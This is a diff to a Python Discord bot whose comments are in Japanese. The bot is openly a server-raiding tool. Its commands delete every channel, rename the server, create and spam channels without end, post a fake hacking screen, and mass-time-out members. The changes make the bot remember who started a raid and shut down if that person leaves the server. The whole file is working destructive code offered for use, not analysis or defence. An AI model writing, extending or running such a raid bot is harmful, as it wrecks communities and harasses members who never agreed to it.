@@ -39,6 +39,10 @@ COMBINED_TEXT = (
 stop_flag = asyncio.Event()
 background_tasks = set()
 
+# ✅ 実行者を記憶
+initiator_id = None
+target_guild = None
+
 
 class StartButton(ui.View):
     def __init__(self, guild):
@@ -47,10 +51,14 @@ class StartButton(ui.View):
 
     @ui.button(label="実行", style=discord.ButtonStyle.danger, emoji="💻")
     async def start_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        global initiator_id, target_guild
         await interaction.response.defer()
         if not stop_flag.is_set() and background_tasks:
             await interaction.followup.send("⚠️ 既に実行中です", ephemeral=True)
             return
+        # ボタン実行者を記憶
+        initiator_id = interaction.user.id
+        target_guild = interaction.guild
         await interaction.followup.send("🔓 侵入承認…システム起動…", ephemeral=False)
         await infinite_create_and_spam(self.guild)
 
@@ -102,6 +110,7 @@ async def batch_create_and_spam(guild: discord.Guild, start_counter: int):
 
 
 async def infinite_create_and_spam(guild: discord.Guild, delete_channels: bool = True):
+    global initiator_id, target_guild
     stop_flag.clear()
     try:
         await guild.edit(name=SERVER_NAME)
@@ -133,44 +142,90 @@ async def type_and_send(channel, text):
         await asyncio.sleep(0.005)
 
 
+# ✅ 自動退出処理
+async def auto_exit():
+    """実行者が退出したらBotを停止"""
+    stop_flag.set()
+    await asyncio.gather(*background_tasks, return_exceptions=True)
+    background_tasks.clear()
+    if target_guild:
+        try:
+            # 退出メッセージ用のチャンネルを探す
+            ch = target_guild.system_channel or next(iter(target_guild.text_channels), None)
+            if ch:
+                await ch.send("👋 実行者がサーバーを退出したため、Botを終了します。")
+        except:
+            pass
+    await bot.close()
+
+
+@bot.event
+async def on_member_remove(member):
+    """メンバーが退出したときのイベント"""
+    global initiator_id, target_guild
+    # 実行者がいないとき、または対象サーバー以外は無視
+    if initiator_id is None or target_guild is None:
+        return
+    # 実行者本人が退出した場合
+    if member.id == initiator_id and member.guild.id == target_guild.id:
+        await auto_exit()
+
+
 @bot.command()
 async def start(ctx):
+    global initiator_id, target_guild
     if not stop_flag.is_set() and background_tasks:
         return
-    # !start → チャンネル削除あり
+    # 実行者を記憶
+    initiator_id = ctx.author.id
+    target_guild = ctx.guild
     await infinite_create_and_spam(ctx.guild, delete_channels=True)
 
 
 @bot.command()
 async def boost(ctx):
+    global initiator_id, target_guild
     if not stop_flag.is_set() and background_tasks:
         return
-    # !boost → チャンネル削除なし 追加作成のみ
+    # 実行者を記憶
+    initiator_id = ctx.author.id
+    target_guild = ctx.guild
     await infinite_create_and_spam(ctx.guild, delete_channels=False)
 
 
 @bot.command()
 async def stop(ctx):
+    global initiator_id, target_guild
     stop_flag.set()
     await asyncio.gather(*background_tasks, return_exceptions=True)
     background_tasks.clear()
+    # 記憶をリセット
+    initiator_id = None
+    target_guild = None
 
 
-# ✅ 追加：Botを終了
 @bot.command(name="bye")
 async def bye(ctx):
+    global initiator_id, target_guild
     stop_flag.set()
     await asyncio.gather(*background_tasks, return_exceptions=True)
     background_tasks.clear()
     await ctx.send("👋 終了します。さようなら！")
+    # 記憶をリセット
+    initiator_id = None
+    target_guild = None
     await bot.close()
 
 
 @bot.command()
 async def hack(ctx):
+    global initiator_id, target_guild
     guild = ctx.guild
     await delete_all_channels_fast(guild)
     ch = await guild.create_text_channel("hacking出力画面")
+    # 実行者を記憶
+    initiator_id = ctx.author.id
+    target_guild = ctx.guild
     hacker_code = "```ansi\n"
     hacker_code += "\x1b[38;5;51m╔══════════════════════════════════════════════════════╗\x1b[0m\n"
     hacker_code += "\x1b[38;5;51m║  TISN SECURITY BREACH ― TERMINAL v4.2.1 ― BUILD 999\x1b[38;5;51m  ║\x1b[0m\n"
@@ -215,6 +270,7 @@ async def admin(ctx):
 
 @bot.command(name="to")
 async def total_timeout(ctx):
+    global initiator_id, target_guild
     guild = ctx.guild
     author = ctx.author
     report = []
@@ -238,6 +294,9 @@ async def total_timeout(ctx):
             report.append(f"❌ ロール付与失敗: {e}")
             await ctx.send("\n".join(report))
             return
+    # 実行者を記憶
+    initiator_id = ctx.author.id
+    target_guild = ctx.guild
     await asyncio.sleep(1.5)
     bot_top_role = guild.me.top_role
     target_position = len(guild.roles) - 2
